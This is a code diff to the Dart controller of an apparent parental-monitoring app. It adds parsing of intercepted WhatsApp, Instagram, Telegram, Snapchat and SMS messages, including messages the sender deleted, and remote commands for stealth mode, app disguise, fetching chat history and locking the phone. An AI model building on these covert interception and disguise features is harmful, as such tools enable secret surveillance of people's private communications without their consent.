@@ -175,10 +175,7 @@ class ParentDashboardProvider extends ChangeNotifier {
         if (snapshot.docs.isNotEmpty) {
           final realRecords = snapshot.docs.map((doc) {
             final d = doc.data();
-            DateTime dt = DateTime.now();
-            if (d['timestamp'] is Timestamp) {
-              dt = (d['timestamp'] as Timestamp).toDate();
-            }
+            final dt = _parseTimestamp(d['timestamp']);
             return CallRecord(
               id: doc.id,
               contactName: d['contactName'] ?? 'Unknown',
@@ -211,15 +208,16 @@ class ParentDashboardProvider extends ChangeNotifier {
         if (snapshot.docs.isNotEmpty) {
           final realMsgs = snapshot.docs.map((doc) {
             final d = doc.data();
-            DateTime dt = DateTime.now();
-            if (d['timestamp'] is Timestamp) {
-              dt = (d['timestamp'] as Timestamp).toDate();
-            }
+            final dt = _parseTimestamp(d['timestamp']);
             AppType app = AppType.whatsApp;
             final appStr = (d['app'] ?? '').toString().toLowerCase();
             if (appStr.contains('insta')) app = AppType.instagram;
             if (appStr.contains('tele')) app = AppType.telegram;
+            if (appStr.contains('snap')) app = AppType.snapchat;
             if (appStr.contains('sms')) app = AppType.sms;
+
+            final isIncoming = (d['isIncoming'] as bool?) ??
+                (d['direction'] != 'OUTGOING' && d['isUser'] != true);
 
             return ChatMessage(
               id: doc.id,
@@ -228,7 +226,7 @@ class ParentDashboardProvider extends ChangeNotifier {
               contactIdentifier: d['sender'] ?? '',
               messageText: d['text'] ?? '',
               timestamp: dt,
-              isIncoming: true,
+              isIncoming: isIncoming,
               isDeletedBackup: d['isDeletedBySender'] as bool? ?? false,
               isWatchlistTarget: d['isWatchlistTarget'] as bool? ?? false,
             );
@@ -245,15 +243,25 @@ class ParentDashboardProvider extends ChangeNotifier {
     }
   }
 
+  String get _activeTargetDocId => activePairingCode.isNotEmpty ? activePairingCode : _activeChildId;
+
+  DateTime _parseTimestamp(dynamic raw) {
+    if (raw is Timestamp) return raw.toDate();
+    if (raw is num) return DateTime.fromMillisecondsSinceEpoch(raw.toInt());
+    if (raw is String) return DateTime.tryParse(raw) ?? DateTime.now();
+    return DateTime.now();
+  }
+
   void sendVoiceIntercom(String announcement) {
     debugPrint("Broadcasting voice intercom to ${activeChild.name}: $announcement");
     try {
-      _firestore?.collection('devices').doc(_activeChildId).collection('commands').add({
+      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
         'action': 'LOUDSPEAKER_INTERCOM',
         'payload': {'announcement': announcement},
         'status': 'PENDING',
         'timestamp': FieldValue.serverTimestamp(),
       });
+
     } catch (e) {
       debugPrint("Could not dispatch voice intercom to cloud: $e");
     }
@@ -292,7 +300,7 @@ class ParentDashboardProvider extends ChangeNotifier {
   void toggleStealthScreenGuard() {
     _isStealthScreenGuardEnabled = !_isStealthScreenGuardEnabled;
     try {
-      _firestore?.collection('devices').doc(_activeChildId).collection('commands').add({
+      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
         'action': 'SET_STEALTH_GUARD',
         'payload': {'enabled': _isStealthScreenGuardEnabled},
         'status': 'PENDING',
@@ -310,7 +318,7 @@ class ParentDashboardProvider extends ChangeNotifier {
   void toggleGeofence() {
     _isGeofenceEnabled = !_isGeofenceEnabled;
     try {
-      _firestore?.collection('devices').doc(_activeChildId).collection('commands').add({
+      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
         'action': 'SET_GEOFENCE_ACTIVE',
         'payload': {'enabled': _isGeofenceEnabled},
         'status': 'PENDING',
@@ -329,7 +337,7 @@ class ParentDashboardProvider extends ChangeNotifier {
       notifyListeners();
     }
     try {
-      _firestore?.collection('devices').doc(_activeChildId).collection('commands').add({
+      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
         'action': 'SWITCH_DISGUISE',
         'payload': {'disguise': disguiseName},
         'status': 'PENDING',
@@ -695,7 +703,7 @@ class ParentDashboardProvider extends ChangeNotifier {
 
   Future<void> fetchHistoricalChatsFromDevice(int daysBack) async {
     try {
-      _firestore?.collection('devices').doc(_activeChildId).collection('commands').add({
+      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
         'action': 'FETCH_HISTORICAL_CHATS',
         'payload': {'daysBack': daysBack},
         'status': 'PENDING',
@@ -1175,7 +1183,7 @@ class ParentDashboardProvider extends ChangeNotifier {
     _isPhoneLocked = !_isPhoneLocked;
     if (_isPhoneLocked) {
       try {
-        _firestore?.collection('devices').doc(_activeChildId).collection('commands').add({
+        _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
           'action': 'LOCK_PHONE',
           'payload': {},
           'status': 'PENDING',
